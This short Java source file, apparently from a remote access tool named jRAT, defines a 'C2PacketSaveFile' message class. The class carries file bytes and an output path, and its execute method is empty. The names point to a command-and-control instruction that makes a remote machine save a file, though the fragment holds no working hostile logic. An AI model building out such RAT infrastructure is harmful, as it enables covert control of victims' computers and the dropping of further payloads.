package net.jrat.core.packet.client;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class C2PacketSaveFile implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private byte[] data;
	private String output;
	
	public C2PacketSaveFile(byte[] data, String output)
	{
		this.data = data;
		this.output = output;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}